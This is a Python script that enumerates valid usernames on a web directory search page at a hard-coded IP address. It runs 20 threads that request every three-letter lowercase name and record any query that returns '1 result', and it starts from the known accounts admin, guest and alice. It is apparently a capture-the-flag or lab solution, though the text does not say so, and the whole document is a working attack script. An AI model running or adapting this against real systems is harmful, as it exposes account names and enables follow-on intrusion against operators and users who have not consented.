import requests
import string
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "http://13.53.139.173/web1/"

def search(user):
    try:
        r = requests.get(URL, params={"user": user, "dept": "All", "office": "Any"}, timeout=5)
        return "1 result" in r.text
    except:
        return False

found_users = []

# Known users
known = ["admin", "guest", "alice"]
for u in known:
    print(f"Known: {u}")
    found_users.append(u)

# Try all lowercase 3-4 letter combinations
print("\nTrying all 3-letter lowercase combinations...")
chars = string.ascii_lowercase
count = 0
with ThreadPoolExecutor(max_workers=20) as executor:
    futures = {}
    for combo in itertools.product(chars, repeat=3):
        user = ''.join(combo)
        futures[executor.submit(search, user)] = user
    
    for future in as_completed(futures):
        user = futures[future]
        count += 1
        if count % 1000 == 0:
            print(f"  Checked {count} combinations...")
        if future.result() and user not in found_users:
            print(f"  FOUND: {user}")
            found_users.append(user)

print(f"\nAll found users: {found_users}")
